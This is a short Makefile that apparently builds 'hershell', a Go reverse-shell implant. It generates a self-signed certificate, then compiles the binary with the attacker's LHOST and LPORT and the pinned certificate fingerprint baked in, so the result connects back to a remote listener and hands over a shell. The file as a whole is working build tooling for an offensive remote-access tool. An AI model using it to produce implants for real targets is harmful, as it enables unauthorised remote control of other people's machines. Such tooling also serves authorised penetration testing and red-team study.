OUT=hershell
SRC=hershell.go
SRV_KEY=server.key
SRV_CRT=server.crt

all: clean depends shell

depends:
	openssl req -subj '/CN=sysdream.com/O=Sysdream/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_CRT}

shell:
	GOOS=${GOOS} GOARCH=${GOARCH} go build --ldflags "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_CRT} | cut -d '=' -f2)" -o ${OUT} ${SRC}
	

clean:
	rm -f ${SRV_KEY} ${SRV_CRT} ${OUT}
